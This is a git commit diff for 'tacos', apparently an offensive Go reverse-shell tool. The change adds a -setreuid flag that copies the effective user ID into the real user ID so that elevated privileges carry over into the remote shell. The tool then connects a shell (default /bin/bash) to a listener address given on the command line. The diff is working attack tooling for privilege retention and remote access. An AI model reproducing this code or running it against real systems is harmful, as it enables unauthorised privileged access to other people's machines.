d000c41925d997852c6d022cc63e2cf6b059bdfc
ariary <ariary9.2@hotmail.fr>
2022-09-15 16:23:21 +0200

    setreuid function

--- cmd/tacos/tacos.go
+++ cmd/tacos/tacos.go
@@ -6,6 +6,7 @@ import (
 	"os"
 	"runtime"
 	"strings"
+	"syscall"
 
 	"github.com/ariary/tacos/pkg/tacos"
 )
@@ -14,11 +15,12 @@ var Remote string
 
 func main() {
 	//var detect, daemon bool
-	var detect bool
+	var detect, setreuid bool
 	var shell string
 	flag.BoolVar(&detect, "detect", false, "Detect default shell to use it in reverse shell")
 	//TODO: flag.BoolVar(&daemon, "daemon", false, "Disown the process from the terminal")
 	flag.StringVar(&shell, "shell", "/bin/bash", "shell to use for reverse shell") //default /bin/bash
+	flag.BoolVar(&setreuid, "setreuid", false, "Set the real and effective user IDs to the EUID parameter")
 	flag.Parse()
 
 	if runtime.GOOS == "windows" {
@@ -29,13 +31,17 @@ func main() {
 		shell = tacos.DetectDefaultShell()
 	}
 
-	if len(os.Args) > 1 {
+	if len(flag.Args()) > 0 {
 		Remote = flag.Arg(0)
 	}
 
 	if Remote == "" {
 		fmt.Println("Usage: tacos [listener_url]:[port]")
 		os.Exit(1)
+	}
+	if setreuid {
+		euid := syscall.Geteuid()    //effective ID
+		syscall.Setreuid(euid, euid) //set real user id to eid, Print error if you want to debug
 	}
 
 	tacos.ShellReverse(Remote, shell)
